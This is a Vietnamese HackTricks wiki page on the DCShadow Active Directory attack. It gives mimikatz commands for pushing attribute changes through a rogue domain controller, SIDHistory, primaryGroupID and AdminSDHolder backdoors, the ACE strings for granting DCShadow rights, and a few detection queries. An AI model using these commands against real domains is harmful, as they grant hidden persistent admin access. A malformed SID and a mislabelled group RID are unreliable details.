# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Kỹ thuật này đăng ký một **Domain Controller** mới trong AD và dùng nó để **đẩy các thuộc tính** (SIDHistory, SPNs...) lên những đối tượng được chỉ định **mà không để lại bất kỳ log nào** về các **thay đổi**. Bạn **cần có đặc quyền DA** và phải ở bên trong **root domain**.\
Lưu ý rằng nếu bạn dùng dữ liệu sai, các log khá tệ sẽ xuất hiện.<sup>[[2]](#references)</sup>

Để thực hiện cuộc tấn công, bạn cần 2 phiên bản mimikatz. Một phiên bản sẽ khởi chạy các RPC server với đặc quyền SYSTEM (tại đây, bạn phải chỉ định những thay đổi muốn thực hiện), còn phiên bản kia sẽ được dùng để đẩy các giá trị:

```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```

Lưu ý rằng **`elevate::token`** sẽ không hoạt động trong session `mimikatz1` vì lệnh này nâng quyền của thread, trong khi chúng ta cần nâng **quyền của process**.\
Bạn cũng có thể chọn đối tượng "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Bạn có thể đẩy các thay đổi từ một DA hoặc từ người dùng có các quyền tối thiểu sau:

- Trên **đối tượng domain**:
  - _DS-Install-Replica_ (Thêm/Xóa Replica trong Domain)
  - _DS-Replication-Manage-Topology_ (Quản lý Replication Topology)
  - _DS-Replication-Synchronize_ (Đồng bộ hóa Replication)
- Trên đối tượng **Sites** (và các đối tượng con của nó) trong **Configuration container**:
  - _CreateChild và DeleteChild_
- Trên đối tượng máy tính được đăng ký làm DC:
  - _WriteProperty_ (không phải Write)
- Trên **đối tượng đích**:
  - _WriteProperty_ (không phải Write)

Bạn có thể dùng [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) để cấp các quyền này cho người dùng không có đặc quyền (lưu ý rằng thao tác này sẽ để lại một số log). Cách này hạn chế hơn nhiều so với việc có quyền DA.\
Ví dụ: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Điều này có nghĩa là username _**student1**_ khi đăng nhập trên máy _**mcorp-student1**_ có quyền DCShadow trên đối tượng _**root1user**_.

## Sử dụng DCShadow để tạo backdoor

```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```

### Lạm dụng primary group, thiếu sót trong liệt kê và phát hiện

- `primaryGroupID` là thuộc tính riêng biệt với danh sách `member` của group. DCShadow/DSInternals có thể ghi trực tiếp thuộc tính này (ví dụ: đặt `primaryGroupID=512` cho **Domain Admins**) mà không chịu sự thực thi của LSASS trên máy, nhưng AD vẫn **di chuyển** user: thay đổi PGID luôn xóa membership khỏi primary group trước đó (hành vi tương tự với mọi group đích), vì vậy bạn không thể giữ membership trong primary group cũ.<sup>[[1]](#references)</sup>
- Các công cụ mặc định không cho phép xóa user khỏi primary group hiện tại của họ (`ADUC`, `Remove-ADGroupMember`), nên việc thay đổi PGID thường cần ghi trực tiếp vào directory (DCShadow/`Set-ADDBPrimaryGroup`).
- Việc báo cáo membership không nhất quán:
  - **Bao gồm** các thành viên có được thông qua primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
  - **Bỏ qua** các thành viên có được thông qua primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit khi kiểm tra `member`, `Get-ADUser <user> -Properties memberOf`.
- Các kiểm tra đệ quy có thể bỏ sót thành viên primary group nếu **chính primary group được lồng trong một group khác** (ví dụ: PGID của user trỏ đến một group lồng bên trong Domain Admins); `Get-ADGroupMember -Recursive` hoặc các LDAP recursive filter sẽ không trả về user đó trừ khi quá trình đệ quy phân giải rõ ràng các primary group.
- Thủ thuật DACL: attacker có thể **từ chối ReadProperty** trên `primaryGroupID` của user (hoặc trên thuộc tính `member` của group không thuộc AdminSDHolder), che giấu membership hiệu lực khỏi hầu hết truy vấn PowerShell; `net group` vẫn phân giải membership. Các group được AdminSDHolder bảo vệ sẽ khôi phục những thiết lập từ chối này.

Ví dụ về phát hiện/giám sát:

```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
  Where-Object { $_.primaryGroupID -ne 513 } |
  Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
  Where-Object { -not $_.primaryGroupID } |
  Select-Object Name,SamAccountName
```

Đối chiếu các nhóm đặc quyền bằng cách so sánh kết quả `Get-ADGroupMember` với `Get-ADGroup -Properties member` hoặc ADSI Edit để phát hiện sai lệch do `primaryGroupID` hoặc các thuộc tính ẩn gây ra.<sup>[[1]](#references)</sup>

## Shadowception - Cấp quyền DCShadow bằng DCShadow (không có log về quyền bị sửa đổi)

Chúng ta cần thêm các ACE sau với SID của người dùng ở cuối:<sup>[[2]](#references)</sup>

- Trên đối tượng domain:
  - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
  - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
  - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Trên đối tượng máy tính của attacker: `(A;;WP;;;UserSID)`
- Trên đối tượng người dùng mục tiêu: `(A;;WP;;;UserSID)`
- Trên đối tượng Sites trong container Configuration: `(A;CI;CCDC;;;UserSID)`

Để lấy ACE hiện tại của một đối tượng: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Trong trường hợp này, bạn cần thực hiện **nhiều thay đổi**, không chỉ một. Trong **phiên mimikatz1** (RPC server), hãy dùng tham số **`/stack` cho mỗi thay đổi**. Sau đó, bạn chỉ cần **`/push` một lần** để áp dụng tất cả thay đổi đã xếp chồng từ rogue server.

[**Tìm hiểu thêm về DCShadow trên ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Những khám phá về hành vi, báo cáo và khai thác Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [Bài viết về DCShadow trên ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
